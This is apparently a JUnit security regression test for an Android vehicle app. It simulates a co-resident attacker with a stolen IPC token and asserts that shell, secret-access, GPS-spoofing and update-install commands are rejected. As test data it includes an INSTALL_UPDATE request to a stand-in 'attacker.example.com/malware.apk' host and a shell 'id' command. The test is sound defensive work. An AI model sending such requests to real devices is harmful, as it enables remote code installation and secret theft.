package net.bladewatch.app.server;

import net.bladewatch.app.config.SecretConfigStore;

import org.json.JSONObject;
import org.junit.After;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;

import java.io.File;
import java.net.ServerSocket;

/**
 * Verification test for uy93.16: simulates a co-resident attacker app with its
 * own UID that holds the world-readable IPC token, and asserts every dangerous
 * IPC command is REJECTED after the Track0 fixes (uy93.1 + uy93.2).
 *
 * Models the threat: an app co-installed on the BYD head unit reads the 644
 * /data/local/tmp/bladewatch_ipc_token, then connects to TcpCommandServer
 * (port 19876) and SurveillanceIpcServer (port 19877) presenting a valid token.
 * The UID gate (PeerCredentials.isTrusted) must reject it because the peer UID
 * is an untrusted app UID (not root, system, shell, or the BladeWatch app UID).
 *
 * Seams used (test-only; no production behaviour changed):
 *   PeerCredentials.peerUidForTest = 10500       — attacker UID injected
 *   PeerCredentials.appUidOverrideForTest = 10085 — BladeWatch's own UID (different)
 *   IpcTokenManager.cachedToken                   — the shared IPC token
 */
public class CoResidentAttackerTest {

    // Token the attacker successfully reads from /data/local/tmp/bladewatch_ipc_token (mode 644)
    private static final String STOLEN_TOKEN = "TestTokenABCDEFGHIJKLMNOPQR012345";

    private static final int BLADEWATCH_UID = 10085;
    private static final int ATTACKER_UID = 10500; // distinct co-resident app

    private TcpCommandServer tcpServer;
    private SurveillanceIpcServer survServer;
    private Thread tcpThread;
    private Thread survThread;
    private int tcpPort;
    private int survPort;
    private File tempStoreFile;

    @Before
    public void setUp() throws Exception {
        // Inject the IPC token (same value the attacker reads from disk)
        IpcTokenManager.cachedToken = STOLEN_TOKEN;

        // Simulate co-resident attacker: peer UID is NOT the BladeWatch app UID
        PeerCredentials.peerUidForTest = ATTACKER_UID;
        PeerCredentials.appUidOverrideForTest = BLADEWATCH_UID;

        tempStoreFile = File.createTempFile("attacker_test_secrets", ".json");
        tempStoreFile.deleteOnExit();
        TcpCommandServer.secretStoreForTest = new SecretConfigStore(tempStoreFile);

        tcpPort = findFreePort();
        tcpServer = new TcpCommandServer(tcpPort);
        tcpThread = new Thread(tcpServer::start, "attacker-test-tcp-server");
        tcpThread.setDaemon(true);
        tcpThread.start();

        survPort = findFreePort();
        survServer = new SurveillanceIpcServer(survPort);
        survThread = new Thread(survServer, "attacker-test-surv-server");
        survThread.setDaemon(true);
        survThread.start();

        Thread.sleep(300);
    }

    @After
    public void tearDown() throws Exception {
        tcpServer.stop();
        survServer.stop();
        IpcTokenManager.cachedToken = null;
        PeerCredentials.peerUidForTest = null;
        PeerCredentials.appUidOverrideForTest = null;
        TcpCommandServer.secretStoreForTest = null;
        if (tempStoreFile != null) tempStoreFile.delete();
    }

    // ---- uy93.1: UID gate must reject co-resident attacker on every dangerous command ----

    /**
     * Verify the attacker cannot authenticate at all (UID gate fires before command dispatch).
     * TcpCommandServer.handleClient() calls PeerCredentials.isTrustedPeer() as the FIRST
     * check; an untrusted peer is closed immediately. All subsequent command tests verify
     * the same gate from different angles.
     */
    @Test
    public void attackerCannotAuthenticateViaTcpIpc() throws Exception {
        // Attacker connects with the valid stolen token — UID gate must still reject.
        // Either the server closes the connection (EOF on read) or responds with error.
        IpcRoundTripTest.TcpClient client = new IpcRoundTripTest.TcpClient(tcpPort);
        try {
            client.connect(STOLEN_TOKEN);
            // If connect didn't throw, try a ping — must get error or connection closed
            JSONObject ping = new JSONObject();
            ping.put("cmd", "ping");
            JSONObject resp = client.sendRaw(ping);
            if (resp != null) {
                // Server is communicating — but the UID gate must reject
                Assert.assertEquals("uy93.1: attacker must be rejected by UID gate",
                        "error", resp.optString("status", "ok"));
            }
            // null response means server closed — also correct (silent rejection)
        } finally {
            client.close();
        }
    }

    /** uy93.2: 'shell' command must be rejected even with valid token (removed by uy93.2). */
    @Test
    public void shellCommandIsRejectedForAttacker() throws Exception {
        // Test via processCommand directly (bypasses socket/UID layer)
        // to pin that the shell command is unconditionally removed (uy93.2 fix).
        TcpCommandServer server = new TcpCommandServer(tcpPort + 100);
        TcpCommandServer.secretStoreForTest = new SecretConfigStore(tempStoreFile);
        JSONObject cmd = new JSONObject();
        cmd.put("cmd", "shell");
        cmd.put("command", "id");
        JSONObject resp = server.processCommand(cmd);
        Assert.assertEquals("uy93.2: shell must return error (command removed)",
                "error", resp.getString("status"));
        Assert.assertTrue("uy93.2: error message must mention 'shell'",
                resp.getString("message").contains("shell"));
    }

    /** uy93.1: secret_get must be unreachable for attacker (UID gate fires first). */
    @Test
    public void secretGetIsRejectedForAttacker() throws Exception {
        assertCommandRejected("secret_get", cmd -> {
            try {
                cmd.put("section", "auth");
                cmd.put("key", "deviceSecret");
            } catch (Exception ignored) {}
        });
    }

    /** uy93.1: secret_put (write) must be unreachable for attacker. */
    @Test
    public void secretPutIsRejectedForAttacker() throws Exception {
        assertCommandRejected("secret_put", cmd -> {
            try {
                cmd.put("section", "auth");
                cmd.put("key", "deviceSecret");
                cmd.put("value", "attacker-injected");
            } catch (Exception ignored) {}
        });
    }

    /** uy93.1: secret_delete must be unreachable for attacker. */
    @Test
    public void secretDeleteIsRejectedForAttacker() throws Exception {
        assertCommandRejected("secret_delete", cmd -> {
            try {
                cmd.put("section", "auth");
                cmd.put("key", "deviceSecret");
            } catch (Exception ignored) {}
        });
    }

    /** uy93.1: secret_get_section must be unreachable for attacker. */
    @Test
    public void secretGetSectionIsRejectedForAttacker() throws Exception {
        assertCommandRejected("secret_get_section", cmd -> {
            try { cmd.put("section", "auth"); } catch (Exception ignored) {}
        });
    }

    // ---- SurveillanceIpcServer (port 19877): UPDATE_GPS and INSTALL_UPDATE must be rejected ----

    /** uy93.1: UPDATE_GPS must be rejected for attacker even with valid token. */
    @Test
    public void updateGpsIsRejectedForAttacker() throws Exception {
        JSONObject request = new JSONObject();
        request.put("token", STOLEN_TOKEN);
        request.put("command", "UPDATE_GPS");
        request.put("lat", 0.0);
        request.put("lng", 0.0);

        // SurveillanceIpcServer silently closes the connection on untrusted UID (null response)
        // or sends {success:false}. Either constitutes a rejection.
        JSONObject response = sendSingleSurvMessage(request);
        assertSurvRejected("uy93.1: attacker UPDATE_GPS", response);
    }

    /** uy93.1: INSTALL_UPDATE must be rejected for attacker even with valid token. */
    @Test
    public void installUpdateIsRejectedForAttacker() throws Exception {
        JSONObject request = new JSONObject();
        request.put("token", STOLEN_TOKEN);
        request.put("command", "INSTALL_UPDATE");
        request.put("url", "http://attacker.example.com/malware.apk");

        // Same silent-close behavior expected
        JSONObject response = sendSingleSurvMessage(request);
        assertSurvRejected("uy93.1: attacker INSTALL_UPDATE", response);
    }

    // ---- Confirm BladeWatch own UID still succeeds (regression guard) ----

    /**
     * Positive path: legitimate BladeWatch process (same app UID) with valid token
     * must still be able to ping after the uy93.1 fix.
     */
    @Test
    public void legitimateBladeWatchAppCanPing() throws Exception {
        // Override peer UID to the BladeWatch app UID — simulates the real app
        PeerCredentials.peerUidForTest = BLADEWATCH_UID;
        IpcRoundTripTest.TcpClient client = new IpcRoundTripTest.TcpClient(tcpPort);
        try {
            client.connect(STOLEN_TOKEN);
            JSONObject ping = new JSONObject();
            ping.put("cmd", "ping");
            JSONObject resp = client.sendRaw(ping);
            Assert.assertNotNull("legitimate app ping must get a response", resp);
            Assert.assertEquals("legitimate app must receive pong", "ok",
                    resp.optString("status", "error"));
        } finally {
            client.close();
            PeerCredentials.peerUidForTest = ATTACKER_UID; // restore for other tests
        }
    }

    // ==================== helpers ====================

    /**
     * SurveillanceIpcServer silently closes the connection on untrusted UID (null response)
     * OR sends {success:false}. Both constitute rejection. Never returns {success:true}.
     */
    private static void assertSurvRejected(String label, JSONObject response) {
        if (response == null) {
            // Silent close — the server rejected before writing any response. This is correct.
            return;
        }
        Assert.assertFalse(label + " must be rejected (success must be false)",
                response.optBoolean("success", true));
    }

    /** Try a command via the raw socket and assert the connection is rejected at the UID gate. */
    private void assertCommandRejected(String cmdName, java.util.function.Consumer<JSONObject> extraFields) throws Exception {
        IpcRoundTripTest.TcpClient client = new IpcRoundTripTest.TcpClient(tcpPort);
        try {
            client.connect(STOLEN_TOKEN);
            JSONObject cmd = new JSONObject();
            cmd.put("cmd", cmdName);
            extraFields.accept(cmd);
            JSONObject resp = client.sendRaw(cmd);
            if (resp != null) {
                // If the server sends a response it must be an error (UID gate fired)
                Assert.assertEquals("uy93.1: cmd '" + cmdName + "' must be rejected by UID gate",
                        "error", resp.optString("status", "ok"));
            }
            // null response = connection closed = rejected. Also acceptable.
        } finally {
            client.close();
        }
    }

    private JSONObject sendSingleSurvMessage(JSONObject request) {
        try (java.net.Socket sock = new java.net.Socket()) {
            sock.connect(new java.net.InetSocketAddress("127.0.0.1", survPort), 3000);
            sock.setSoTimeout(5000);
            java.io.PrintWriter writer = new java.io.PrintWriter(sock.getOutputStream(), true);
            java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(sock.getInputStream()));
            writer.println(request.toString());
            String line = reader.readLine();
            return line != null ? new JSONObject(line) : null;
        } catch (java.net.SocketException e) {
            // Connection reset by server (silent UID-gate rejection) — treat as null response
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    private static int findFreePort() throws Exception {
        try (ServerSocket s = new ServerSocket(0)) {
            s.setReuseAddress(true);
            return s.getLocalPort();
        }
    }
}
